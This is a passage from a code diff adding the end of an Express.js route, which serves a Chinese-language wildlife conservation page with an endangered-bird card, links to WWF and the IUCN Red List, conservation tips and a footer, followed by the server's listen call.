+        <h3>中华秋沙鸭</h3>
+        <div class="latin">Mergus squamatus</div>
+        <div class="desc">被誉为"水中活化石"的珍稀鸟类，对水质极为敏感，是生态环境的指示物种。全球仅存约5,000只左右。</div>
+        <span class="tag tag-en">濒危 EN</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="cta">
+    <h2>每个人都能成为守护者</h2>
+    <p>保护野生动物不需要超能力，只需要你我每一个微小的行动。拒绝野味、不购买野生动物制品、支持生态保护项目。</p>
+    <div class="cta-actions">
+      <a class="cta-btn primary" href="https://www.worldwildlife.org" target="_blank">🌱 了解更多</a>
+      <a class="cta-btn secondary" href="https://www.iucnredlist.org" target="_blank">📋 IUCN 红色名录</a>
+    </div>
+  </div>
+
+  <h2 class="section-title">💡 <span>你可以做的事</span></h2>
+
+  <div class="tips">
+    <div class="tip-item">
+      <div class="icon">🚫</div>
+      <div class="text">
+        <h4>拒绝野生动物制品</h4>
+        <p>不购买象牙、犀角、穿山甲鳞片等野生动物制品，从源头减少对野生动物的需求。</p>
+      </div>
+    </div>
+    <div class="tip-item">
+      <div class="icon">🌿</div>
+      <div class="text">
+        <h4>支持生态保护</h4>
+        <p>关注并支持本地和国际生态保护组织，参与植树造林和栖息地恢复项目。</p>
+      </div>
+    </div>
+    <div class="tip-item">
+      <div class="icon">📢</div>
+      <div class="text">
+        <h4>传播保护意识</h4>
+        <p>在社交媒体上分享野生动物保护知识，让更多人了解生物多样性的重要性。</p>
+      </div>
+    </div>
+    <div class="tip-item">
+      <div class="icon">🔍</div>
+      <div class="text">
+        <h4>举报违法行为</h4>
+        <p>如发现非法猎捕、贩卖野生动物的行为，请拨打 12315 或联系当地林业部门举报。</p>
+      </div>
+    </div>
+    <div class="tip-item">
+      <div class="icon">♻️</div>
+      <div class="text">
+        <h4>减少碳排放</h4>
+        <p>气候变化是野生动物面临的最大威胁之一。低碳出行、节约能源，为地球降温。</p>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="hearts">🐼 🐅 🐘 🐋 🦏 🦅</div>
+    <p>守护每一个生灵，因为我们共享同一个地球</p>
+    <p style="margin-top: 8px;">Wildlife Conservation &copy; ${new Date().getFullYear()}</p>
+  </footer>
+</body>
+</html>`;
+  res.send(html);
+});
+
+app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
